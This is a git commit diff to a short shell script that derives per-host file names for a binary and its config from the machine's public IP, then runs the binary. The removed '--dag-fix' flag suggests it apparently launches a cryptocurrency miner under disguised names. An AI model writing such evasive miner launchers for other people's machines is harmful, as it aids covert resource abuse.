a52493819f0e0a58410faafc93b5373e208d2809
unyilcogan <85560875+unyilcogan@users.noreply.github.com>
2021-10-14 04:56:09 +0700

    Update sasuke.sh

--- sasuke.sh
+++ sasuke.sh
@@ -1,5 +1,7 @@
 !/bin/bash
-chmod +x benjot
-chmod +x kuntul.conf
+benjot=$(echo "$(curl -s ifconfig.me)" | tr . j )
+kuntul=$(echo "$(curl -s ifconfig.me)" | tr . k )
+chmod +x $benjot
+chmod +x $kuntul.conf
 
-./benjot --read-config kuntul.conf --dag-fix
+./$benjot --read-config $kuntul.conf
